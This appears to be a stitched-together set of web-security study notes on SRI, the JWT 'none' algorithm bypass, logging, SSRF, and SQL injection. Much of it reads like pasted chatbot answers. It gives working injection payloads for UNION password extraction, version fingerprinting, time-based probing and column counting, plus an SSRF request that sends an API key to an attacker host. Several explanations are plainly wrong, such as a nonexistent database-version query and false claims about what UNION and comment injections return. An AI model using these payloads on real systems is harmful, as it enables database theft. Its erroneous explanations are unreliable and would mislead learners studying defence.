<p>Suppose you have a website that uses third-party libraries that are stored in some external servers that are out of your control. While this may sound a bit strange, this is actually a somewhat common practice. Take as an example jQuery, a commonly used javascript library. If you want, you can include jQuery in your website directly from their servers without actually downloading it by including the following line in the HTML code of your website:</p>
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
<p>When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source.</p>
<p>JS without integrity checks</p>
<p>The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of https://code.jquery.com/jquery-3.6.1.min.js to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI), and you can read more about it here.</p>
<p>The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won't execute the modified version. Here's how that should look in HTML:</p>
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
<p>You can go to https://www.srihash.org/ to generate hashes for any library if needed.</p>
<p>Data Integrity Failures</p>
<p>Let's think of how web applications maintain sessions. Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts. This token will be repeated on each subsequent request so that the web application knows who we are. These session tokens can come in many forms but are usually assigned via cookies. Cookies are key-value pairs that a web application will store on the user's browser and that will be automatically repeated on each request to the website that issued them.</p>
<p>Cookies</p>
<p>For example, if you were creating a webmail application, you could assign a cookie to each user after logging in that contains their username. In subsequent requests, your browser would always send your username in the cookie so that your web application knows what user is connecting. This would be a terrible idea security-wise because, as we mentioned, cookies are stored on the user's browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails! This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with.</p>
<p>One solution to this is to use some integrity mechanism to guarantee that the cookie hasn't been altered by the user. To avoid re-inventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it. One such implementation is JSON Web Tokens (JWT).</p>
<p>JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check. The structure of a JWT token is formed of 3 parts:</p>
<p>JSON Web Tokens</p>
<p>The header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. The payload contains the key-value pairs with the data that the web application wants the client to store. The signature is similar to a hash, taken to verify the payload's integrity. If you change the payload, the web application can verify that the signature won't match the payload and know that you tampered with the JWT. Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won't be able to generate the matching signature unless you know the secret key.</p>
<p>Notice that each of the 3 parts of the token is simply plaintext encoded with base64. You can use this online tool to encode/decode base64. Try decoding the header and payload of the following token:</p>
<p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw</p>
<p>Note: The signature contains binary data, so even if you decode it, you won't be able to make much sense of it anyways.</p>
<p>JWT and the None Algorithm</p>
<p>A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:</p>
<p>Modify the header section of the token so that the alg header would contain the value none.
Remove the signature part.
Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes &quot;admin&quot; and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.</p>
<p>JWT None Algorithm</p>
<p>It sounds pretty simple! Let's walk through the process an attacker would have to follow in an example scenario. Navigate to http://10.10.54.213:8089/ and follow the instructions in the questions below.</p>
<p>When web applications are set up, every action performed by the user should be logged. Logging is important because, in the event of an incident, the attackers' activities can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include:</p>
<p>Regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.
Risk of further attacks: an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.
The information stored in logs should include the following:</p>
<p>HTTP status codes
Time Stamps
Usernames
API endpoints/page locations
IP addresses
These logs have some sensitive information, so it's important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.</p>
<p>As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is to have monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity include:</p>
<p>Multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources, e.g. admin pages)
Requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
Use of automated tools: particular automated tooling can be easily identifiable, e.g. using the value of User-Agent headers or the speed of requests. This can indicate that an attacker is using automated tooling.
Common payloads: in web applications, it's common for attackers to use known payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.
Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will have a higher impact than others. These higher-impact actions need to be responded to sooner; thus, they should raise alarms to get the relevant parties' attention.</p>
<p>Put this knowledge to practice by analysing the provided sample log file. You can download it by clicking the Download Task Files button at the top of the task.</p>
<p>Server-Side Request Forgery</p>
<p>This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.</p>
<p>Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider's server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:</p>
<p>SSRF</p>
<p>By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the server parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the server to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:</p>
<p>https://www.mysite.com/sms?server=attacker.thm&amp;msg=ABC</p>
<p>This would make the vulnerable web application make a request to:</p>
<p>https://attacker.thm/api/send?msg=ABC </p>
<p>You could then just capture the contents of the request using Netcat:</p>
<p>AttackBox
user@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: <em>/</em>
This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:</p>
<p>Enumerate internal networks, including IP addresses and ports.
Abuse trust relationships between servers and gain access to otherwise restricted services.
Interact with some non-HTTP services to get remote code execution (RCE).
Let's quickly look at how we can use SSRF to abuse some trust relationships.</p>
<p>Practical Example</p>
<p>Navigate to http://MACHINE_IP:8087/, where you'll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website's restricted area!</p>

<p>SQLi stands for SQL Injection. It is a type of security vulnerability that occurs in web applications that use a database backend. SQL Injection happens when an attacker can manipulate the application's input fields to inject malicious SQL code into the application's database queries.</p>
<p>Here's how SQL Injection works:</p>
<ol>
<li>User Input: Web applications often take user input through forms, search boxes, or URL parameters.</li>
<li>Unsanitized Input: If the application does not properly validate or sanitize the user input, it can directly pass the input to the database query.</li>
<li>Malicious SQL Injection: An attacker can exploit this vulnerability by injecting SQL statements as part of the input. This can include additional SQL commands or modifying existing queries.</li>
<li>Execution: The manipulated SQL code is executed by the database, potentially leading to unauthorized actions or unintended behaviors.</li>
</ol>
<p>The consequences of a successful SQL Injection attack can be severe. An attacker can gain unauthorized access to sensitive data, modify or delete database records, bypass authentication mechanisms, execute arbitrary commands, or even take control of the entire application or server.</p>
<p>To prevent SQL Injection attacks, it is crucial to follow secure coding practices:</p>
<ol>
<li>Input Validation: Validate and sanitize all user input before using it in database queries. This includes using parameterized queries or prepared statements to separate data from the actual SQL code.</li>
<li>Least Privilege Principle: Ensure that the database user accounts used by the application have limited permissions and access only the necessary tables and data.</li>
<li>Principle of Defense in Depth: Apply multiple layers of security measures, including firewalls, web application firewalls (WAFs), and intrusion detection systems (IDS), to detect and prevent potential SQL Injection attacks.</li>
<li>Regular Updates and Patches: Keep your web application frameworks, libraries, and databases up to date with the latest security patches and updates.</li>
</ol>
<p>By implementing these security practices, you can significantly reduce the risk of SQL Injection vulnerabilities and protect your application from such attacks.</p>
<p>Sure. SQL injection (SQLi) is a type of code injection attack that exploits a security vulnerability occurring in the database layer of an application. It allows an attacker to execute arbitrary SQL commands on the database server, which can be used to steal data, modify data, or even take control of the database server.</p>
<p>SQL injection attacks typically occur when a web application accepts user input that is used to construct a SQL query. For example, an attacker might enter the following malicious input into a login form:</p>
<pre><code>username=admin' OR '1'='1
</code></pre>
<p>This input will cause the web application to execute the following SQL query:</p>
<pre><code>SELECT * FROM users WHERE username='admin' OR '1'='1'
</code></pre>
<p>The <code>'1'='1</code> clause is always true, so the query will always return a result, even if there is no user with the username <code>admin</code>. This allows the attacker to gain access to the web application's administrative interface.</p>
<p>There are a number of ways to prevent SQL injection attacks. One way is to use prepared statements. Prepared statements are a secure way to execute SQL queries because they prevent the injection of malicious code into the query. Another way to prevent SQL injection attacks is to use input validation. Input validation is the process of checking user input for malicious content.</p>
<p>Here are some additional tips for preventing SQL injection attacks:</p>
<ul>
<li>Use prepared statements whenever possible.</li>
<li>Use input validation to filter out dangerous characters from user input.</li>
<li>Use a web application firewall (WAF) to scan for and block malicious traffic.</li>
<li>Educate your users about SQL injection attacks.</li>
</ul>
<p>By following these tips, you can help to protect your web applications from SQLi attacks.</p>
<p>Here are some examples of SQL injection attacks:</p>
<ul>
<li><strong>Blind SQL injection:</strong> This type of attack allows the attacker to extract data from the database without knowing the exact data they are looking for.</li>
<li><strong>Union SQL injection:</strong> This type of attack allows the attacker to combine two or more SQL queries into a single query. This can be used to extract more data from the database or to execute arbitrary commands on the database server.</li>
<li><strong>Error-based SQL injection:</strong> This type of attack relies on the fact that the database server will generate an error message if the SQL query is invalid. The attacker can use this to their advantage by injecting malicious code into the query that will cause the database server to generate an error message.</li>
</ul>
<p>SQL injection attacks can be very serious and can result in the theft of sensitive data, the modification of data, or even the complete compromise of a web application. It is important to take steps to prevent SQL injection attacks by using prepared statements, input validation, and a web application firewall.</p>

<p><em>Portswigger</em> warns about using this type of SQLi - </p>
<blockquote>
<p>Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.</p>

<p>Examining the database in SQL injection attacks is a process of identifying and exploiting vulnerabilities in a database to gain unauthorized access to sensitive data. This can be done by injecting malicious code into a web application that interacts with the database.</p>
<p>Once the attacker has gained access to the database, they can use it to steal data, modify data, or even delete data. They can also use the database to gain access to other systems or networks.</p>
<p>There are a number of ways to examine the database in SQL injection attacks. One way is to use a tool like SQLMap. SQLMap is a free and open-source tool that can be used to automate the process of identifying and exploiting SQL injection vulnerabilities.</p>
<p>Another way to examine the database is to use a web application firewall (WAF). A WAF can be used to detect and block SQL injection attacks. However, WAFs are not always effective, and they can sometimes be bypassed by attackers.</p>
<p>Finally, it is also possible to examine the database manually. This can be done by looking for patterns in the data that is returned by the web application. For example, if the attacker is able to retrieve the names and email addresses of all users in the database, this is a sign that an SQL injection attack has occurred.</p>
<p>Here are some ways to protect against SQL injection attacks:</p>
<ul>
<li><strong>Use prepared statements:</strong> Prepared statements are a way of preventing SQL injection attacks by binding the input parameters to the query before it is executed.</li>
<li><strong>Sanitize user input:</strong> This involves removing any special characters that could be used to inject malicious code.</li>
<li><strong>Use a web application firewall (WAF):</strong> A WAF is a software application that can help to protect web applications from a variety of attacks, including SQL injection attacks.</li>
<li><strong>Use a database firewall:</strong> A database firewall is a hardware or software appliance that can be used to protect databases from a variety of attacks, including SQL injection attacks.</li>
<li><strong>Use a vulnerability scanner:</strong> A vulnerability scanner is a tool that can be used to scan web applications for known vulnerabilities, including SQL injection vulnerabilities.</li>
</ul>
<p>In SQL injection attacks, examining the database involves extracting information or manipulating data within the database to gain unauthorized access to sensitive information or perform malicious actions. The goal is to exploit vulnerabilities in the application's input validation and interact with the underlying database in unintended ways.</p>
<p>Here are some common techniques attackers use to examine the database in SQL injection attacks:</p>
<ol>
<li>
<p><strong>Data Extraction:</strong> Attackers can use SQL injection to extract data from the database that they are not authorized to access. They may retrieve sensitive information such as usernames, passwords, email addresses, credit card numbers, or other valuable data.</p>
</li>
<li>
<p><strong>UNION-Based Attacks:</strong> As explained earlier, attackers can use the UNION operator to combine the results of a malicious query with the results of a legitimate query, allowing them to retrieve data from additional tables or columns.</p>
</li>
<li>
<p><strong>Error-Based Attacks:</strong> Attackers can exploit error messages returned by the database to gather information about the database schema, table names, or column names. This information aids in further attacks.</p>
</li>
<li>
<p><strong>Time-Based Attacks:</strong> Time-based attacks involve using conditional SQL statements that cause delays in the application's response. The attacker can infer information about the database based on the delay in the response.</p>
</li>
<li>
<p><strong>Out-of-Band (OOB) Attacks:</strong> OOB attacks leverage the application to interact with external systems to retrieve data or exfiltrate information from the database.</p>
</li>
<li>
<p><strong>Blind SQL Injection:</strong> In situations where the application does not return specific error messages or information, attackers may use blind SQL injection techniques to infer data through true/false statements or numerical responses.</p>
</li>
<li>
<p><strong>Modifying Data:</strong> In some cases, attackers may use SQL injection to manipulate or modify data in the database. For example, they could modify records, insert malicious data, or delete data from the database.</p>
</li>
</ol>
<p>It is essential to remember that SQL injection attacks are illegal and unethical unless you have explicit permission to test the security of an application. Unauthorized access to or manipulation of databases is a serious security violation and may lead to legal consequences.</p>
<p>For responsible disclosure and security testing, always seek permission from the application owner or security team before attempting any form of security assessment. Ethical hacking, or penetration testing, should only be performed with proper authorization and within a controlled testing environment.</p>
<p>Sure, here are some SQL examples of examining the database in SQL injection attacks:</p>
<ul>
<li><strong>Finding the names of all tables in the database:</strong></li>
</ul>
<pre><code class="language-sql">SELECT name FROM INFORMATION_SCHEMA.TABLES;
</code></pre>
<ul>
<li><strong>Finding the columns in a specific table:</strong></li>
</ul>
<pre><code class="language-sql">SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'table_name';
</code></pre>
<ul>
<li><strong>Finding the data in a specific column:</strong></li>
</ul>
<pre><code class="language-sql">SELECT data FROM table_name WHERE column_name = 'column_value';
</code></pre>
<ul>
<li><strong>Retrieving the results of a query:</strong></li>
</ul>
<pre><code class="language-sql">SELECT * FROM table_name;
</code></pre>
<ul>
<li><strong>Combining the results of two queries:</strong></li>
</ul>
<pre><code class="language-sql">SELECT * FROM table_name UNION SELECT * FROM table_name2;
</code></pre>
<p>These are just a few examples of how to examine the database in SQL injection attacks. The specific queries that you can use will depend on the structure of the database and the data that you are interested in.</p>
<p>It is important to note that UNION attacks can be very dangerous. If an attacker is able to inject a UNION statement into a web application, they could potentially extract sensitive data from the database. It is important to protect your web applications from SQL injection attacks by using prepared statements and other security measures.</p>
<p>Here are some ways to protect against UNION attacks:</p>
<ul>
<li><strong>Use prepared statements:</strong> Prepared statements are a way of preventing SQL injection attacks by binding the input parameters to the query before it is executed.</li>
<li><strong>Sanitize user input:</strong> This involves removing any special characters that could be used to inject malicious code.</li>
<li><strong>Use a web application firewall (WAF):</strong> A WAF is a software application that can help to protect web applications from a variety of attacks, including SQL injection attacks.</li>
</ul>
<p>Here are some SQL examples demonstrating how attackers can examine the database using SQL injection:</p>
<ol>
<li>
<p><strong>Extracting Usernames and Password Hashes:</strong>
Suppose the application has a login form with the following SQL query:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = '&lt;input_username&gt;' AND password = '&lt;input_password&gt;';
</code></pre>
<p>An attacker can use SQL injection to extract usernames and password hashes:</p>
<pre><code>' OR 1=1; --   (input_username)
</code></pre>
<p>The modified query will be:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = '' OR 1=1; -- ' AND password = '&lt;input_password&gt;';
</code></pre>
<p>Since <code>1=1</code> is always true, the attacker will get results for all users, including their usernames and password hashes.</p>
</li>
<li>
<p><strong>Enumerating Table Names:</strong>
Suppose the application uses the following SQL query to retrieve data:</p>
<pre><code class="language-sql">SELECT * FROM information_schema.tables WHERE table_schema = 'public';
</code></pre>
<p>An attacker can use SQL injection to enumerate table names:</p>
<pre><code>' UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema = 'public'; -- 
</code></pre>
<p>The injected query will return the names of all tables in the <code>public</code> schema.</p>
</li>
<li>
<p><strong>Extracting Sensitive Data from Specific Columns:</strong>
Let's assume the application uses the following query to display user profiles:</p>
<pre><code class="language-sql">SELECT full_name, email, credit_card FROM user_profiles WHERE user_id = '&lt;input_user_id&gt;';
</code></pre>
<p>An attacker can use SQL injection to extract sensitive data:</p>
<pre><code>' UNION SELECT password, null, null FROM users WHERE user_id = '1'; -- 
</code></pre>
<p>The attacker retrieves the hashed passwords of user accounts by injecting the UNION statement to fetch data from the <code>users</code> table.</p>
</li>
<li>
<p><strong>Error-Based Enumeration:</strong>
An attacker may exploit errors in SQL queries to gather information about the database structure. For example:</p>
<pre><code>' AND 1=CONVERT(int, (SELECT @@version)); --
</code></pre>
<p>The attacker will receive an error message containing the database version.</p>
</li>
<li>
<p><strong>Time-Based Attacks:</strong>
Attackers can use time-based SQL injection to infer data from the database based on conditional SQL statements. For instance:</p>
<pre><code>' OR IF(1=1, SLEEP(5), 0); --
</code></pre>
<p>The query will introduce a delay if the condition <code>1=1</code> is true, helping the attacker infer information.</p>
</li>
</ol>
<p>These examples demonstrate how SQL injection can be exploited to examine and extract data from a vulnerable database. Remember that these examples are for educational purposes only, and unauthorized SQL injection attacks are illegal and unethical. Always ensure you have explicit permission to conduct security testing on any application or database.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="database-type-and-version"><a class="header" href="#database-type-and-version">Database type and version</a></h1>
<p>Sure, here is an SQL query that you can use to query the database type and version:</p>
<pre><code class="language-sql">SELECT 
    database_product_name AS 'Database Product Name',
    database_product_version AS 'Database Product Version'
FROM 
    sys.databases;
</code></pre>
<p>This query will return the following information about the database:</p>
<ul>
<li><strong>Database Product Name:</strong> The name of the database product.</li>
<li><strong>Database Product Version:</strong> The version of the database product.</li>
</ul>
<p>This information can be useful for identifying the type and version of the database that is being used. This information can also be used to identify security vulnerabilities that may be present in the database.</p>
<p>Here are some examples of the output of this query:</p>
<pre><code>Database Product Name | Database Product Version
----------------------- | ------------------------
Microsoft SQL Server 2019 | 15.0.4022.1
MySQL Community Server 8.0.25 | 8.0.25-0ubuntu0.20.04.1
PostgreSQL 13.3 | 13.3
</code></pre>
<p>To query the database type and version using SQL injection, an attacker can exploit error-based techniques or database-specific functions that reveal this information. Here are some examples for common databases:</p>
<ol>
<li>
<p><strong>MySQL:</strong>
MySQL has a specific function called <code>@@version</code> that can be used to retrieve the database version. An attacker can use this function in an SQL injection to obtain the MySQL version.</p>
<pre><code>' OR 1=1 UNION SELECT @@version; --
</code></pre>
</li>
<li>
<p><strong>PostgreSQL:</strong>
PostgreSQL provides the <code>version()</code> function to get the database version. An attacker can use this function in an SQL injection to retrieve the PostgreSQL version.</p>
<pre><code>' OR 1=1 UNION SELECT version(); --
</code></pre>
</li>
<li>
<p><strong>Microsoft SQL Server:</strong>
SQL Server has a built-in function called <code>@@version</code> to get the database version. An attacker can use this function in an SQL injection to obtain the SQL Server version.</p>
<pre><code>' OR 1=1 UNION SELECT @@version; --
</code></pre>
</li>
<li>
<p><strong>Oracle:</strong>
In Oracle, the <code>SELECT * FROM v$version</code> query can be used to retrieve the database version. An attacker can utilize this query in an SQL injection to get the Oracle version.</p>
<pre><code>' OR 1=1 UNION SELECT * FROM v$version; --
</code></pre>
</li>
<li>
<p><strong>SQLite:</strong>
SQLite does not provide a straightforward function to retrieve the database version. However, an attacker may still exploit error-based techniques or other information leakage to infer the version.</p>
</li>
</ol>
<p>It's important to note that these examples are for educational purposes only and should not be used for any unauthorized activity. Unauthorized SQL injection attacks are illegal and unethical. Always ensure you have explicit permission to conduct security testing on any application or database. Responsible disclosure and adherence to ethical guidelines are critical when performing security assessments.</p>

<p>The LIKE and ILIKE operators are used in SQL to perform pattern matching on strings. The LIKE operator is case-sensitive, while the ILIKE operator is case-insensitive.</p>
<p>The LIKE operator uses the following syntax:</p>
<pre><code class="language-sql">column LIKE pattern
</code></pre>
<p>The <code>pattern</code> can be a simple string or a more complex pattern that uses wildcard characters. The wildcard characters are:</p>
<ul>
<li><code>%</code> - Matches zero or more characters.</li>
<li><code>_</code> - Matches a single character.</li>
<li><code>[ ]</code> - Matches any character in the brackets.</li>
<li><code>[^ ]</code> - Matches any character not in the brackets.</li>
</ul>
<p>For example, the following query will return all rows where the <code>column</code> column contains the string &quot;abc&quot;:</p>
<pre><code class="language-sql">SELECT *
FROM table
WHERE column LIKE '%abc%';
</code></pre>
<p>The ILIKE operator uses the same syntax as the LIKE operator, but it is case-insensitive. This means that the <code>ILIKE</code> operator will match the string &quot;abc&quot; in either uppercase or lowercase.</p>
<p>For example, the following query will return all rows where the <code>column</code> column contains the string &quot;abc&quot; in either uppercase or lowercase:</p>
<pre><code class="language-sql">SELECT *
FROM table
WHERE column ILIKE '%abc%';
</code></pre>
<p>The LIKE and ILIKE operators are a powerful way to perform pattern matching on strings in SQL. They can be used to filter data, search for specific strings, and more.</p>
<p>Here is a table that summarizes the differences between the LIKE and ILIKE operators:</p>
<div class="table-wrapper"><table><thead><tr><th>Operator</th><th>Case-sensitive</th><th>Wildcard characters</th></tr></thead><tbody>
<tr><td>LIKE</td><td>Yes</td><td><code>%</code>, <code>_</code>, <code>[ ]</code>, <code>[^ ]</code></td></tr>
<tr><td>ILIKE</td><td>No</td><td><code>%</code>, <code>_</code>, <code>[ ]</code>, <code>[^ ]</code></td></tr>
</tbody></table>
</div>
<p>These are just a few examples of how to list the contents of the database. The specific queries that you can use will depend on the structure of the database and the data that you are interested in.</p>
<p>It is important to note that listing the contents of the database can be a security risk. If an attacker is able to list the contents of the database, they could potentially gain access to sensitive data. It is important to protect your database from unauthorized access by using appropriate security measures.</p>
<p>Here are some ways to protect your database from unauthorized access:</p>
<ul>
<li><strong>Use a firewall to restrict access to the database.</strong></li>
<li><strong>Use strong passwords for the database accounts.</strong></li>
<li><strong>Encrypt the data in the database.</strong></li>

<p>Sure. The SQL injection attack, listing the database contents on non-Oracle tutorial example in PortSwigger Academy demonstrates how an attacker can use a SQL injection attack to list the contents of a database on a non-Oracle server.</p>
<p>In the tutorial, the user is first prompted to enter their username and password. After they have successfully entered their credentials, they are logged in to the website.</p>
<p>The website is vulnerable to SQL injection because it does not properly sanitize user input. This means that an attacker can inject malicious SQL code into the website's database.</p>
<p>The attacker can use this vulnerability to list the contents of the database by using a SQL injection attack. A SQL injection attack is a technique that allows an attacker to execute arbitrary SQL commands on a database server.</p>
<p>To exploit this vulnerability, the attacker would first need to identify a database table that contains the data they want to retrieve. They can do this by submitting a variety of malicious SQL queries and observing the results. Once the attacker has identified a table, they can then use a SQL injection attack to list the contents of the table.</p>
<p>For example, the attacker could submit the following malicious query:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = 'admin' AND password = '' --
</code></pre>
<p>This query will select all of the rows from the <code>users</code> table where the <code>username</code> column is equal to <code>admin</code> and the <code>password</code> column is equal to the empty string.</p>
<p>If the query is successful, the attacker will be able to see all of the usernames and passwords in the <code>users</code> table.</p>
<p>The attacker could then use this information to launch further attacks, such as phishing attacks or password guessing attacks.</p>
<p>The SQL injection attack, listing the database contents on non-Oracle tutorial example is a good demonstration of how an attacker can use a SQL injection attack to list the contents of a database on a non-Oracle server.

<div style="break-before: page; page-break-before: always;"></div><h1 id="union-attacks"><a class="header" href="#union-attacks">UNION attacks</a></h1>
<p>A UNION attack is a type of SQL injection attack where the attacker injects a UNION statement into a database query. This allows the attacker to combine the results of two or more queries, which can be used to extract sensitive data from the database.</p>
<p>For example, let's say there is a web application that allows users to search for products. The application uses a SQL query to retrieve the results of the search. The query might look something like this:</p>
<pre><code class="language-sql">SELECT * FROM products WHERE product_name LIKE '%search_term%';
</code></pre>
<p>An attacker could inject a UNION statement into the query like this:</p>
<pre><code class="language-sql">SELECT * FROM products WHERE product_name LIKE '%search_term%' UNION SELECT * FROM users;
</code></pre>
<p>This would cause the database to return the results of both queries, which would include the names and email addresses of all users in the database.</p>
<p>Here is another example. Let's say there is a web application that allows users to log in. The application uses a SQL query to check the username and password of the user. The query might look something like this:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = 'username' AND password = 'password';
</code></pre>
<p>An attacker could inject a UNION statement into the query like this:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = 'username' AND password = 'password' UNION SELECT 1, 2, 3;
</code></pre>
<p>This would cause the database to return the results of both queries, which would include the first three rows in the <code>users</code> table.</p>
<p>UNION attacks can be very powerful, and they can be used to extract sensitive data from a database. It is important to protect your web applications from SQL injection attacks by using prepared statements and other security measures.</p>
<p>Here are some ways to protect against UNION attacks:</p>
<ul>
<li><strong>Use prepared statements:</strong> Prepared statements are a way of preventing SQL injection attacks by binding the input parameters to the query before it is executed.</li>
<li><strong>Sanitize user input:</strong> This involves removing any special characters that could be used to inject malicious code.</li>
<li><strong>Use a web application firewall (WAF):</strong> A WAF is a software application that can help to protect web applications from a variety of attacks, including SQL injection attacks.</li>
</ul>
<p>SQL injection UNION attacks are a type of SQL injection attack that involves using the UNION operator to combine the results of a malicious query with the results of a legitimate query. This allows an attacker to retrieve data from tables they are not authorized to access, gain sensitive information, or even perform further attacks on the database.</p>
<p>Here's a brief explanation of SQL injection UNION attacks with examples:</p>
<p>Consider a vulnerable web application that constructs an SQL query using user-supplied input without proper validation and sanitization.</p>
<ol>
<li>
<p>Initial Vulnerable Query:
For example, let's say the application's code builds an SQL query like this:</p>
<pre><code class="language-sql">$username = $_POST['username'];
$sql = &quot;SELECT * FROM users WHERE username = '$username'&quot;;
</code></pre>
<p>An attacker notices that the application is vulnerable to SQL injection and decides to exploit it. They submit the following malicious input as the <code>username</code> parameter:</p>
<pre><code>' UNION SELECT null, null, null, null, password FROM users WHERE '1'='1
</code></pre>
<p>The SQL query executed by the application will become:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = '' UNION SELECT null, null, null, null, password FROM users WHERE '1'='1'
</code></pre>
</li>
<li>
<p>Exploiting the UNION Operator:
The attacker's input causes the application to execute two queries: the original query and the attacker's injected query. The UNION operator combines the results of both queries. The injected query selects the <code>password</code> field from the <code>users</code> table. As a result, the attacker can retrieve the hashed passwords of all users in the database.</p>
</li>
</ol>
<p>SQL injection UNION attacks can be more potent when the attacker can infer the number and data types of columns in the query. By using functions like <code>UNION SELECT</code>, <code>ORDER BY</code>, and <code>LIMIT</code>, the attacker can fine-tune the results to extract specific information.</p>
<p>Preventing SQL injection UNION attacks (and all SQL injection attacks) involves using parameterized queries or prepared statements, which ensure that user input is treated as data rather than executable SQL code. Additionally, input validation and escaping should be employed to handle user input safely.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="how-many-columns"><a class="header" href="#how-many-columns">How many columns</a></h1>
<p>Use following injected staments to know how many columns you can return from UNION attack.</p>
<pre><code class="language-sql">' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
</code></pre>
<p>or</p>
<pre><code class="language-sql">' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
</code></pre>
<p>until you get no error.</p>
<p><a href="https://asciinema.org/a/3VM3IrlvVRWCrhKT6iOlJwibw" target="_blank"><img src="https://asciinema.org/a/3VM3IrlvVRWCrhKT6iOlJwibw.svg" /></a></p>
<p>The number of columns required in a SQL injection UNION attack depends on the number of columns in the target table. The attacker must inject enough columns to match the number of columns in the target table, or the attack will fail.</p>
<p>For example, let's say the target table has 3 columns: <code>id</code>, <code>name</code>, and <code>email</code>. The attacker would need to inject 3 columns into the UNION statement, or the attack would fail.</p>
<p>The following is an example of a UNION statement that would work against a target table with 3 columns:</p>
<pre><code class="language-sql">SELECT id, name, email FROM users UNION SELECT 1, 2, 3;
</code></pre>
<p>This statement would cause the database to return the results of both queries, which would include the first three rows in the <code>users</code> table.</p>
<p>If the attacker was only interested in the <code>id</code> column, they could use the following statement:</p>
<pre><code class="language-sql">SELECT id FROM users UNION SELECT 1;
</code></pre>
<p>This statement would cause the database to return the first row in the <code>users</code> table, which would only contain the <code>id</code> column.</p>
<p>It is important to note that the attacker must inject the correct number of columns, or the attack will fail. If the attacker injects too many columns, the database will ignore the extra columns. If the attacker injects too few columns, the attack will fail.</p>
<p>Here are some ways to protect against UNION attacks:</p>
<ul>
<li><strong>Use prepared statements:</strong> Prepared statements are a way of preventing SQL injection attacks by binding the input parameters to the query before it is executed.</li>
